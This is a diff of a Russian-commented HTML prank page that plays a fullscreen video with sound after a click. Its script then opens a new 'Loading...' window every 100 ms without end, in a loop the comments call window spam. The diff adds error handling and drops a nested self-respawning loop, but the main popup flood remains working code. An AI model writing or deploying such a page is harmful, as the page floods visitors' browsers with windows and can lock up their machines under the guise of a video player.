@@ -16,6 +16,7 @@
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
             background: #000; cursor: pointer; z-index: 9999;
+            padding: 20px; text-align: center;
         }
         #start-screen h1 {
             font-size: 22px; color: #fff; margin-bottom: 30px;
@@ -36,6 +37,12 @@
         #fullscreen-video {
             width: 100%; height: 100%; object-fit: cover;
         }
+        /* Текст ошибки, если видео не найдено */
+        #error-msg {
+            position: fixed; bottom: 20px; left: 0; right: 0;
+            color: #ff4444; font-size: 14px; text-align: center;
+            z-index: 999; font-family: monospace;
+        }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -48,13 +55,20 @@
     </div>
 
     <div id="video-container">
-        <video id="fullscreen-video" loop playsinline>
+        <video id="fullscreen-video" loop playsinline preload="auto">
             <source src="video.mp4" type="video/mp4">
+            Ваш браузер не поддерживает видео.
         </video>
     </div>
 
+    <div id="error-msg"></div>
+
     <script>
         var started = false;
+
+        function showError(text) {
+            document.getElementById('error-msg').innerText = text;
+        }
 
         function startVideo() {
             if (started) return;
@@ -64,43 +78,39 @@
             document.getElementById('video-container').style.display = 'block';
 
             var video = document.getElementById('fullscreen-video');
-            video.muted = false;
-            video.play().catch(function(e) {
-                video.muted = true;
-                video.play().catch(function(){});
-            });
+            
+            // Проверяем ошибки загрузки самого файла
+            video.onerror = function() {
+                showError('Ошибка: файл video.mp4 не найден или поврежден!');
+            };
 
-            // Сразу же запускаем попытки спама каждые 0.1 секунды (100 мс) без остановки
+            video.muted = false;
+            var playPromise = video.play();
+
+            if (playPromise !== undefined) {
+                playPromise.then(function() {
+                    // Видео успешно запустилось со звуком
+                }).catch(function(error) {
+                    console.log('Автоплей со звуком заблокирован, пробуем без звука:', error);
+                    video.muted = true;
+                    video.play().catch(function(e) {
+                        showError('Ошибка воспроизведения видео: ' + e.message);
+                    });
+                });
+            }
+
+            // Пытаемся запустить спам окон (если браузер разрешит)
             setInterval(function() {
                 try {
                     var w = window.open('', '_blank');
                     if (w) {
                         w.document.write(`
                             <html>
-                            <head>
-                                <title>Loading...</title>
-                                <style>
-                                    html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
-                                    video { width: 100%; height: 100%; object-fit: cover; }
-                                </style>
-                            </head>
-                            <body>
-                                <video id="v" loop playsinline>
+                            <head><title>Loading...</title></head>
+                            <body style="margin:0;background:#000;overflow:hidden;">
+                                <video id="v" loop playsinline autoplay style="width:100%;height:100%;object-fit:cover;">
                                     <source src="video.mp4" type="video/mp4">
                                 </video>
-                                <script>
-                                    var v = document.getElementById('v');
-                                    v.muted = false;
-                                    v.play().catch(function() {
-                                        v.muted = true;
-                                        v.play().catch(function(){});
-                                    });
-                                    
-                                    // Внутри копии тоже долбимся каждые 0.1 сек
-                                    setInterval(function() {
-                                        try { window.open(window.location.href, '_blank'); } catch(e) {}
-                                    }, 100);
-                                <\/script>
                             </body>
                             </html>
                         `);
